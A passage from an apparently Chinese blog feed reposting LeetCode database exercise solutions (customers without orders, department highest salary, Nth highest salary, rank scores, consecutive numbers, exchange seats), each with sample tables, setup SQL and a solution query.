id="SQL-Schema-7"><a href="#SQL-Schema-7" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> Employee<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Employee <span class="token punctuation">(</span> Id <span class="token keyword">INT</span><span class="token punctuation">,</span> NAME <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> Salary <span class="token keyword">INT</span><span class="token punctuation">,</span> ManagerId <span class="token keyword">INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Employee <span class="token punctuation">(</span> Id<span class="token punctuation">,</span> NAME<span class="token punctuation">,</span> Salary<span class="token punctuation">,</span> ManagerId <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Joe'</span><span class="token punctuation">,</span> <span class="token number">70000</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Henry'</span><span class="token punctuation">,</span> <span class="token number">80000</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Sam'</span><span class="token punctuation">,</span> <span class="token number">60000</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'Max'</span><span class="token punctuation">,</span> <span class="token number">90000</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    E1<span class="token punctuation">.</span>NAME <span class="token keyword">AS</span> Employee<span class="token keyword">FROM</span>    Employee E1    <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> Employee E2    <span class="token keyword">ON</span> E1<span class="token punctuation">.</span>ManagerId <span class="token operator">=</span> E2<span class="token punctuation">.</span>Id    <span class="token operator">AND</span> E1<span class="token punctuation">.</span>Salary <span class="token operator">></span> E2<span class="token punctuation">.</span>Salary<span class="token punctuation">;</span></code></pre><h1 id="183-Customers-Who-Never-Order"><a href="#183-Customers-Who-Never-Order" class="headerlink" title="183. Customers Who Never Order"></a>183. Customers Who Never Order</h1><p><a href="https://leetcode.com/problems/customers-who-never-order/description/" target="_blank" rel="noopener">https://leetcode.com/problems/customers-who-never-order/description/</a></p><h2 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h2><p>Curstomers 表：</p><pre><code>+----+-------+| Id | Name  |+----+-------+| 1  | Joe   || 2  | Henry || 3  | Sam   || 4  | Max   |+----+-------+</code></pre><p>Orders 表：</p><pre><code>+----+------------+| Id | CustomerId |+----+------------+| 1  | 3          || 2  | 1          |+----+------------+</code></pre><p>查找没有订单的顾客信息：</p><pre><code>+-----------+| Customers |+-----------+| Henry     || Max       |+-----------+</code></pre><h2 id="SQL-Schema-8"><a href="#SQL-Schema-8" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> Customers<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Customers <span class="token punctuation">(</span> Id <span class="token keyword">INT</span><span class="token punctuation">,</span> NAME <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> Orders<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Orders <span class="token punctuation">(</span> Id <span class="token keyword">INT</span><span class="token punctuation">,</span> CustomerId <span class="token keyword">INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Customers <span class="token punctuation">(</span> Id<span class="token punctuation">,</span> NAME <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Joe'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Henry'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Sam'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'Max'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Orders <span class="token punctuation">(</span> Id<span class="token punctuation">,</span> CustomerId <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h2><p>左外链接</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    C<span class="token punctuation">.</span>Name <span class="token keyword">AS</span> Customers<span class="token keyword">FROM</span>    Customers C    <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> Orders O    <span class="token keyword">ON</span> C<span class="token punctuation">.</span>Id <span class="token operator">=</span> O<span class="token punctuation">.</span>CustomerId<span class="token keyword">WHERE</span>    O<span class="token punctuation">.</span>CustomerId <span class="token operator">IS</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span></code></pre><p>子查询</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    Name <span class="token keyword">AS</span> Customers<span class="token keyword">FROM</span>    Customers<span class="token keyword">WHERE</span>    Id <span class="token operator">NOT</span> <span class="token operator">IN</span> <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> CustomerId <span class="token keyword">FROM</span> Orders <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="184-Department-Highest-Salary"><a href="#184-Department-Highest-Salary" class="headerlink" title="184. Department Highest Salary"></a>184. Department Highest Salary</h1><p><a href="https://leetcode.com/problems/department-highest-salary/description/" target="_blank" rel="noopener">https://leetcode.com/problems/department-highest-salary/description/</a></p><h2 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h2><p>Employee 表：</p><pre><code>+----+-------+--------+--------------+| Id | Name  | Salary | DepartmentId |+----+-------+--------+--------------+| 1  | Joe   | 70000  | 1            || 2  | Henry | 80000  | 2            || 3  | Sam   | 60000  | 2            || 4  | Max   | 90000  | 1            |+----+-------+--------+--------------+</code></pre><p>Department 表：</p><pre><code>+----+----------+| Id | Name     |+----+----------+| 1  | IT       || 2  | Sales    |+----+----------+</code></pre><p>查找一个 Department 中收入最高者的信息：</p><pre><code>+------------+----------+--------+| Department | Employee | Salary |+------------+----------+--------+| IT         | Max      | 90000  || Sales      | Henry    | 80000  |+------------+----------+--------+</code></pre><h2 id="SQL-Schema-9"><a href="#SQL-Schema-9" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> Employee<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Employee <span class="token punctuation">(</span> Id <span class="token keyword">INT</span><span class="token punctuation">,</span> NAME <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> Salary <span class="token keyword">INT</span><span class="token punctuation">,</span> DepartmentId <span class="token keyword">INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> Department<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Department <span class="token punctuation">(</span> Id <span class="token keyword">INT</span><span class="token punctuation">,</span> NAME <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Employee <span class="token punctuation">(</span> Id<span class="token punctuation">,</span> NAME<span class="token punctuation">,</span> Salary<span class="token punctuation">,</span> DepartmentId <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Joe'</span><span class="token punctuation">,</span> <span class="token number">70000</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Henry'</span><span class="token punctuation">,</span> <span class="token number">80000</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Sam'</span><span class="token punctuation">,</span> <span class="token number">60000</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'Max'</span><span class="token punctuation">,</span> <span class="token number">90000</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Department <span class="token punctuation">(</span> Id<span class="token punctuation">,</span> NAME <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'IT'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Sales'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h2><p>创建一个临时表，包含了部门员工的最大薪资。可以对部门进行分组，然后使用 MAX() 汇总函数取得最大薪资。</p><p>之后使用连接找到一个部门中薪资等于临时表中最大薪资的员工。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    D<span class="token punctuation">.</span>NAME Department<span class="token punctuation">,</span>    E<span class="token punctuation">.</span>NAME Employee<span class="token punctuation">,</span>    E<span class="token punctuation">.</span>Salary<span class="token keyword">FROM</span>    Employee E<span class="token punctuation">,</span>    Department D<span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> DepartmentId<span class="token punctuation">,</span> <span class="token function">MAX</span><span class="token punctuation">(</span> Salary <span class="token punctuation">)</span> Salary <span class="token keyword">FROM</span> Employee <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> DepartmentId <span class="token punctuation">)</span> M<span class="token keyword">WHERE</span>    E<span class="token punctuation">.</span>DepartmentId <span class="token operator">=</span> D<span class="token punctuation">.</span>Id    <span class="token operator">AND</span> E<span class="token punctuation">.</span>DepartmentId <span class="token operator">=</span> M<span class="token punctuation">.</span>DepartmentId    <span class="token operator">AND</span> E<span class="token punctuation">.</span>Salary <span class="token operator">=</span> M<span class="token punctuation">.</span>Salary<span class="token punctuation">;</span></code></pre><h1 id="176-Second-Highest-Salary"><a href="#176-Second-Highest-Salary" class="headerlink" title="176. Second Highest Salary"></a>176. Second Highest Salary</h1><p><a href="https://leetcode.com/problems/second-highest-salary/description/" target="_blank" rel="noopener">https://leetcode.com/problems/second-highest-salary/description/</a></p><h2 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h2><pre><code>+----+--------+| Id | Salary |+----+--------+| 1  | 100    || 2  | 200    || 3  | 300    |+----+--------+</code></pre><p>查找工资第二高的员工。</p><pre><code>+---------------------+| SecondHighestSalary |+---------------------+| 200                 |+---------------------+</code></pre><p>没有找到返回 null 而不是不返回数据。</p><h2 id="SQL-Schema-10"><a href="#SQL-Schema-10" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> Employee<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Employee <span class="token punctuation">(</span> Id <span class="token keyword">INT</span><span class="token punctuation">,</span> Salary <span class="token keyword">INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Employee <span class="token punctuation">(</span> Id<span class="token punctuation">,</span> Salary <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">200</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">300</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h2><p>为了在没有查找到数据时返回 null，需要在查询结果外面再套一层 SELECT。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> Salary <span class="token keyword">FROM</span> Employee <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> Salary <span class="token keyword">DESC</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> SecondHighestSalary<span class="token punctuation">;</span></code></pre><h1 id="177-Nth-Highest-Salary"><a href="#177-Nth-Highest-Salary" class="headerlink" title="177. Nth Highest Salary"></a>177. Nth Highest Salary</h1><h2 id="Description-11"><a href="#Description-11" class="headerlink" title="Description"></a>Description</h2><p>查找工资第 N 高的员工。</p><h2 id="SQL-Schema-11"><a href="#SQL-Schema-11" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><p>同 176。</p><h2 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">FUNCTION</span> getNthHighestSalary <span class="token punctuation">(</span> N <span class="token keyword">INT</span> <span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">INT</span> <span class="token keyword">BEGIN</span><span class="token keyword">SET</span> N <span class="token operator">=</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RETURN</span> <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> Salary <span class="token keyword">FROM</span> Employee <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> Salary <span class="token keyword">DESC</span> <span class="token keyword">LIMIT</span> N<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span></code></pre><h1 id="178-Rank-Scores"><a href="#178-Rank-Scores" class="headerlink" title="178. Rank Scores"></a>178. Rank Scores</h1><p><a href="https://leetcode.com/problems/rank-scores/description/" target="_blank" rel="noopener">https://leetcode.com/problems/rank-scores/description/</a></p><h2 id="Description-12"><a href="#Description-12" class="headerlink" title="Description"></a>Description</h2><p>得分表：</p><pre><code>+----+-------+| Id | Score |+----+-------+| 1  | 3.50  || 2  | 3.65  || 3  | 4.00  || 4  | 3.85  || 5  | 4.00  || 6  | 3.65  |+----+-------+</code></pre><p>将得分排序，并统计排名。</p><pre><code>+-------+------+| Score | Rank |+-------+------+| 4.00  | 1    || 4.00  | 1    || 3.85  | 2    || 3.65  | 3    || 3.65  | 3    || 3.50  | 4    |+-------+------+</code></pre><h2 id="SQL-Schema-12"><a href="#SQL-Schema-12" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> Scores<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Scores <span class="token punctuation">(</span> Id <span class="token keyword">INT</span><span class="token punctuation">,</span> Score <span class="token keyword">DECIMAL</span> <span class="token punctuation">(</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Scores <span class="token punctuation">(</span> Id<span class="token punctuation">,</span> Score <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3.5</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3.65</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4.0</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3.85</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4.0</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3.65</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-12"><a href="#Solution-12" class="headerlink" title="Solution"></a>Solution</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    S1<span class="token punctuation">.</span>score<span class="token punctuation">,</span>    <span class="token function">COUNT</span><span class="token punctuation">(</span> <span class="token keyword">DISTINCT</span> S2<span class="token punctuation">.</span>score <span class="token punctuation">)</span> Rank<span class="token keyword">FROM</span>    Scores S1    <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> Scores S2    <span class="token keyword">ON</span> S1<span class="token punctuation">.</span>score <span class="token operator">&lt;=</span> S2<span class="token punctuation">.</span>score<span class="token keyword">GROUP</span> <span class="token keyword">BY</span>    S1<span class="token punctuation">.</span>id<span class="token keyword">ORDER</span> <span class="token keyword">BY</span>    S1<span class="token punctuation">.</span>score <span class="token keyword">DESC</span><span class="token punctuation">;</span></code></pre><h1 id="180-Consecutive-Numbers"><a href="#180-Consecutive-Numbers" class="headerlink" title="180. Consecutive Numbers"></a>180. Consecutive Numbers</h1><p><a href="https://leetcode.com/problems/consecutive-numbers/description/" target="_blank" rel="noopener">https://leetcode.com/problems/consecutive-numbers/description/</a></p><h2 id="Description-13"><a href="#Description-13" class="headerlink" title="Description"></a>Description</h2><p>数字表：</p><pre><code>+----+-----+| Id | Num |+----+-----+| 1  |  1  || 2  |  1  || 3  |  1  || 4  |  2  || 5  |  1  || 6  |  2  || 7  |  2  |+----+-----+</code></pre><p>查找连续出现三次的数字。</p><pre><code>+-----------------+| ConsecutiveNums |+-----------------+| 1               |+-----------------+</code></pre><h2 id="SQL-Schema-13"><a href="#SQL-Schema-13" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> LOGS<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> LOGS <span class="token punctuation">(</span> Id <span class="token keyword">INT</span><span class="token punctuation">,</span> Num <span class="token keyword">INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> LOGS <span class="token punctuation">(</span> Id<span class="token punctuation">,</span> Num <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-13"><a href="#Solution-13" class="headerlink" title="Solution"></a>Solution</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    <span class="token keyword">DISTINCT</span> L1<span class="token punctuation">.</span>num ConsecutiveNums<span class="token keyword">FROM</span>    Logs L1<span class="token punctuation">,</span>    Logs L2<span class="token punctuation">,</span>    Logs L3<span class="token keyword">WHERE</span> L1<span class="token punctuation">.</span>id <span class="token operator">=</span> l2<span class="token punctuation">.</span>id <span class="token operator">-</span> <span class="token number">1</span>    <span class="token operator">AND</span> L2<span class="token punctuation">.</span>id <span class="token operator">=</span> L3<span class="token punctuation">.</span>id <span class="token operator">-</span> <span class="token number">1</span>    <span class="token operator">AND</span> L1<span class="token punctuation">.</span>num <span class="token operator">=</span> L2<span class="token punctuation">.</span>num    <span class="token operator">AND</span> l2<span class="token punctuation">.</span>num <span class="token operator">=</span> l3<span class="token punctuation">.</span>num<span class="token punctuation">;</span></code></pre><h1 id="626-Exchange-Seats"><a href="#626-Exchange-Seats" class="headerlink" title="626. Exchange Seats"></a>626. Exchange Seats</h1><p><a href="https://leetcode.com/problems/exchange-seats/description/" target="_blank" rel="noopener">https://leetcode.com/problems/exchange-seats/description/</a></p><h2 id="Description-14"><a href="#Description-14" class="headerlink" title="Description"></a>Description</h2><p>seat 表存储着座位对应的学生。</p><pre class=" language-sql"><code class="language-sql"><span class="token operator">+</span><span class="token comment" spellcheck="true">---------+---------+</span><span class="token operator">|</span>    id   <span class="token operator">|</span> student <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">---------+---------+</span><span class="token operator">|</span>    <span class="token number">1</span>    <span class="token operator">|</span> Abbot   <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">2</span>    <span class="token operator">|</span> Doris   <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">3</span>    <span class="token operator">|</span> Emerson <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">4</span>    <span class="token operator">|</span> Green   <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">5</span>    <span class="token operator">|</span> Jeames  <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">---------+---------+</span></code></pre><p>要求交换相邻座位的两个学生，如果最后一个座位是奇数，那么不交换这个座位上的学生。</p><pre class=" language-sql"><code class="language-sql"><span class="token operator">+</span><span class="token comment" spellcheck="true">---------+---------+</span><span class="token operator">|</span>    id   <span class="token operator">|</span> student <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">---------+---------+</span><span class="token operator">|</span>    <span class="token number">1</span>    <span class="token operator">|</span> Doris   <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">2</span>    <span class="token operator">|</span> Abbot   <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">3</span>    <span class="token operator">|</span> Green   <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">4</span>    <span class="token operator">|</span> Emerson <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">5</span>    <span class="token operator">|</span> Jeames  <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">---------+---------+</span></code></pre><h2 id="SQL-Schema-14"><a href="#SQL-Schema-14" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> seat<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> seat <span class="token punctuation">(</span> id <span class="token keyword">INT</span><span class="token punctuation">,</span> student <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> seat <span class="token punctuation">(</span> id<span class="token punctuation">,</span> student <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'Abbot'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'Doris'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'Emerson'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'Green'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'Jeames'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-14"><a href="#Solution-14" class="headerlink" title="Solution"></a>Solution</h2><p>使用多个 union。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    s1<span class="token punctuation">.</span>id <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">AS</span> id<span class="token punctuation">,</span>    s1<span class="token punctuation">.</span>student<span class="token keyword">FROM</span>    seat s1<span class="token keyword">WHERE</span>    s1<span class="token punctuation">.</span>id MOD <span class="token number">2</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token keyword">UNION</span><span class="token keyword">SELECT</span>    s2<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token number">1</span> <span class="token keyword">AS</span> id<span class="token punctuation">,</span>    s2<span class="token punctuation">.</span>student<span class="token keyword">FROM</span>    seat s2<span class="token keyword">WHERE</span>    s2<span class="token punctuation">.</span>id MOD <span class="token number">2</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token operator">AND</span> s2<span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> <span class="token function">max</span><span class="token punctuation">(</span> s3<span class="token punctuation">.</span>id <span class="token punctuation">)</span> <span class="token keyword">FROM</span> seat s3 <span class="token punctuation">)</span> <span class="token keyword">UNION</span><span class="token keyword">SELECT</span>    s4<span class="token punctuation">.</span>id <span class="token keyword">AS</span> id<span class="token punctuation">,</span>    s4<span class="token punctuation">.</span>student<span class="token keyword">FROM</span>    seat s4<span class="token keyword">WHERE</span>    s4<span class="token punctuation">.</span>id MOD <span class="token number">2</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token operator">AND</span> s4<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> <span class="token function">max</span><span class="token punctuation">(</span> s5<span class="token punctuation">.</span>id <span class="token punctuation">)</span> <span class="token keyword">FROM</span> seat s5 <span class="token punctuation">)</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span>    id<span class="token punctuation">;</span></code></pre><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode-Database 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
